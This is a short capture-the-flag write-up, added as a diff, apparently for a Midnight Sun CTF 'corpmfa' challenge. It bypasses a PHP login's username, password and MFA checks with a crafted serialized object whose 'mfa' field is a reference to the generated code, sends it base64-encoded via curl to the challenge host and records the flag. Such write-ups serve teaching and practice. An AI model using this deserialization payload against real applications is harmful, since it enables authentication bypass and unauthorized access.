@@ -1,0 +1,32 @@
+Needs to Bypass 3 layers
+```
+private function verifyUsername()
+{
+	return $this->userData->username === 'D0loresH4ze';
+}
+
+private function verifyPassword()
+{
+	return password_verify($this->userData->password, '$2y$07$BCryptRequires22Chrcte/VlQH0piJtjXl.0t1XkA8pw9dMXTpOq');
+}
+
+private function verifyMFA()
+{
+	$this->userData->_correctValue = random_int(1e10, 1e11 - 1);
+	return (int)$this->userData->mfa === $this->userData->_correctValue;
+}
+```
+
+Password in plaintext from website...
+	https://www.php.net/manual/en/function.password-verify.php
+
+
+
+php serialize.php
+	O:4:"User":4:{s:8:"username";s:11:"D0loresH4ze";s:8:"password";s:13:"rasmuslerdorf";s:13:"_correctValue";N;s:3:"mfa";R:4;}
+
+base64 encode
+	Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjExOiJEMGxvcmVzSDR6ZSI7czo4OiJwYXNzd29yZCI7czoxMzoicmFzbXVzbGVyZG9yZiI7czoxMzoiX2NvcnJlY3RWYWx1ZSI7TjtzOjM6Im1mYSI7Ujo0O30=
+
+curl http://corpmfa-01.play.midnightsunctf.se/?userdata=Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjExOiJEMGxvcmVzSDR6ZSI7czo4OiJwYXNzd29yZCI7czoxMzoicmFzbXVzbGVyZG9yZiI7czoxMzoiX2NvcnJlY3RWYWx1ZSI7TjtzOjM6Im1mYSI7Ujo0O30=
+	midnight{395E160F-4DB8-4D7A-99EF-08E6799741B5}
